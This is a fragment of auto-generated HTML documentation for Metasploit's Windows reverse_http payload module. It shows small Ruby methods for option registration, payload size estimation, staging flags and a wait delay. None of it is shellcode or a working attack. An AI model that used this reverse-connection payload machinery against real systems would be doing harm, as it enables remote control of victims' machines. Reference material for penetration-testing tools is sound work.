</div>
    
      <div class="method_details ">
  <h3 class="signature " id="initialize-instance_method">
  
    - (<tt>Object</tt>) <strong>initialize</strong>(*args) 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Register reverse_http specific options</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


26
27
28
29
30
31
32</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/reverse_http.rb', line 26</span>

<span class='kw'>def</span> <span class='id identifier rubyid_initialize'>initialize</span><span class='lparen'>(</span><span class='op'>*</span><span class='id identifier rubyid_args'>args</span><span class='rparen'>)</span>
  <span class='kw'>super</span>
  <span class='id identifier rubyid_register_advanced_options'>register_advanced_options</span><span class='lparen'>(</span>
    <span class='lbracket'>[</span>
      <span class='const'>OptInt</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HTTPStagerURILength</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='lbracket'>[</span><span class='kw'>false</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>The URI length for the stager (at least 5 bytes)</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
    <span class='rbracket'>]</span><span class='comma'>,</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_class'>class</span><span class='rparen'>)</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="required_space-instance_method">
  
    - (<tt>Object</tt>) <strong>required_space</strong> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Determine the maximum amount of space required for the features requested</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/reverse_http.rb', line 102</span>

<span class='kw'>def</span> <span class='id identifier rubyid_required_space'>required_space</span>
  <span class='comment'># Start with our cached default generated size
</span>  <span class='id identifier rubyid_space'>space</span> <span class='op'>=</span> <span class='id identifier rubyid_cached_size'>cached_size</span>

  <span class='comment'># Add 100 bytes for the encoder to have some room
</span>  <span class='id identifier rubyid_space'>space</span> <span class='op'>+=</span> <span class='int'>100</span>

  <span class='comment'># Make room for the maximum possible URL length
</span>  <span class='id identifier rubyid_space'>space</span> <span class='op'>+=</span> <span class='int'>256</span>

  <span class='comment'># EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
</span>  <span class='id identifier rubyid_space'>space</span> <span class='op'>+=</span> <span class='int'>31</span>

  <span class='comment'># The final estimated size
</span>  <span class='id identifier rubyid_space'>space</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="stage_over_connection?-instance_method">
  
    - (<tt>Boolean</tt>) <strong>stage_over_connection?</strong> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Do not transmit the stage over the connection.  We handle this via HTTPS</p>


  </div>
</div>
<div class="tags">
  
<p class="tag_title">Returns:</p>
<ul class="return">
  
    <li>
      
      
        <span class='type'>(<tt>Boolean</tt>)</span>
      
      
      
    </li>
  
</ul>

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


326
327
328</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/reverse_http.rb', line 326</span>

<span class='kw'>def</span> <span class='id identifier rubyid_stage_over_connection?'>stage_over_connection?</span>
  <span class='kw'>false</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="wfs_delay-instance_method">
  
    - (<tt>Object</tt>) <strong>wfs_delay</strong> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Always wait at least 20 seconds for this payload (due to staging delays)</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


333
334
335</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/reverse_http.rb', line 333</span>

<span class='kw'>def</span> <span class='id identifier rubyid_wfs_delay'>wfs_delay</span>
  <span class='int'>20</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
  </div>

</div>

    <div id="footer">
  Generated on Tue Mar 17 22:48:24 2015 by
  <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
  0.8.7.4 (ruby-2.1.5).
</div>

  </body>
</html>